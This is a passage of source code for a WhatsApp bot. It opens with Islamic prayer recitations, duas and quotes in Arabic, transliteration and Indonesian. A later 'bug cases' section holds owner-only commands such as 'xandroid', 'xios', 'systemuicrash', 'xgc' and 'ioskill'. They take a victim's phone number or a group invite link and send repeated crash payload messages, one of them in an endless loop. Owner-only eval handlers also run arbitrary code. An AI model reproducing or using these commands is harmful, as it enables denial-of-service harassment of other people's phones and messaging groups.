      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    replygcyuta(`${contoh} + ${data}`)
}
break
//=========================================\\
case 'doaharian': {
    let src = JSON.parse(fs.readFileSync('./database/doaharian.json', 'utf-8'))
    let caption = src.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    replygcyuta(`${caption}`)

}
break
//=========================================\\
case 'niatsholat': {
    if (!q) return replygcyuta(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return replygcyuta(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    replygcyuta(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break
//=========================================\\
case 'quotesislami': {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    replygcyuta(`${arabic}\n${arti}`)
}
break
//=========================================\\
case 'doatahlil': {
    let { result } = JSON.parse(fs.readFileSync('./database/tahlil.json', 'utf-8'))
    let caption = result.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    replygcyuta(`${caption}`)
}
break
//=========================================\\

 //bug cases
case "xandroid": {
  if (!YutaTheCreator) return
  if (!text) return replygcyuta(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcyuta(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcyuta("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Yuta.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285752535878") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcyuta("The number is not registered on WhatsApp");
  }
  replygcyuta("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios": {
  if (!YutaTheCreator) return
  if (!text) return replygcyuta(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcyuta(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcyuta("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Yuta.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285752535878") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcyuta("The number is not registered on WhatsApp");
  }
  replygcyuta("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity mo
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios2":
  {
	if (!YutaTheCreator) return
    if (!isBot) {
      return replygcyuta("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcyuta(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcyuta("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcyuta("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(m.chat, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xandroid2":
  {
	if (!YutaTheCreator) return
    if (!isBot) {
      return replygcyuta("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcyuta(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcyuta("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcyuta("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(m.chat, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xgc":
  {
    if (!YutaTheCreator) return
    if (!text) {
      return replygcyuta("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replygcyuta("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replygcyuta("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await Yuta.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replygcyuta("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
      Yuta.groupLeave(groupTarget);
    } catch (error) {
      replygcyuta(util.format(error));
    }
  }
  break;
  case "🙂":
  {
	if (!YutaTheCreator) return
    if (!isBot) {
      return replygcyuta("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcyuta(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcyuta("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcyuta("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendViewOnceMessages(m.chat, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "systemuicrash": {
  if (!YutaTheCreator) return
  if (!text) return replygcyuta(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcyuta(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcyuta("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Yuta.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285752535878") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcyuta("The number is not registered on WhatsApp");
  }
  replygcyuta("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xsysui": {
  if (!YutaTheCreator) return
  if (!text) return replygcyuta(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcyuta(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcyuta("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Yuta.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285752535878") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcyuta("The number is not registered on WhatsApp");
  }
  replygcyuta("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'ioskill': case 'iosx': {
            	if (!YutaTheCreator) return
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replygcyuta(`Example : .${command} 6285752535878`)
await replygcyuta(`In process....`)
let target = xeonyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
if (!YutaTheCreator) return
if (!q) return replygcyuta(`Usage .${command} 6285752535878`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replygcyuta(`Example : .${command} 6285752535878`)
let target = xeonyvictim + '@s.whatsapp.net'
await replygcyuta(`In process....`)
for (let j = 0; j < 1; j++) {
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
}
await replygcyuta(`Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
}
break

default:

if (budy.startsWith('=>')) {
  if (!YutaTheCreator) return
  replygcyuta(`*[ sʏsᴛᴇᴍ ] Eval Exceling......*`)
  function Return(sul) {
    sat = JSON.stringify(sul, null, 2)
    bang = util.format(sat)
    if (sat == undefined) {
      bang = util.format(sul)
    }
    return m.reply(`${bang}`)
  }
  try {
    replygcyuta(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
  } catch (e) {
    //replygcyuta(String(e))
    m.reply(`${e}`)
  }
}

if (budy.startsWith('=<')) {
  if (!YutaTheCreator) return
  replygcyuta(`*[ sʏsᴛᴇᴍ ] Eval Exceling......*`)
/*  function Return(sul) {
    sat = JSON.stringify(sul, null, 2)
    bang = util.format(sat)
    if (sat == undefined) {
      bang = util.format(sul)
    }
    return m.reply(`${bang}`)
  }*/
  
try {
return replygcyuta(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(`${e}`)
}
  /*
  try {
    replygcyuta(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
  } catch (e) {
    //replygcyuta(String(e))
    m.reply(`${e}`)
  }*/
}

if (budy.startsWith('>') || budy.startsWith('=x')) {
  if (!YutaTheCreator) return
  replygcyuta(`*[ sʏsᴛᴇᴍ ] Eval Exceling......*`)
  try {
    let evaled = await eval(budy.slice(2))
    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
    await m.reply(`${evaled}`)
  } catch (err) {
    //await replygcyuta(String(err))
    await m.reply(`EVAL ERROR\n ${err}`)
    console.log(`EVAL ERROR\n ${err}`)
    
  }
}

nodecron.schedule('00 0 * * *', () => {
  process.exit()
}, {
  scheduled: true,
  timezone: 'Asia/Jakarta'
});

if (budy.startsWith('zx') || budy.startsWith('Zx') || budy.startsWith('ZX') || budy.startsWith('=z')) {
  if (!YutaTheCreator) return
  replygcyuta(`*[ sʏsᴛᴇᴍ ] Eval Exceling......*`)
  try {
    let evaled = await eval(`async function tess() { ${budy.slice(3)} }; tess()`)
    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
    await m.reply(`${evaled}`)
  } catch (err) {
    //await replygcyuta(String(err))
    await m.reply(`EVAL ERROR\n`+err)
    console.log(`EVAL ERROR\n`+err)
    
  }
}
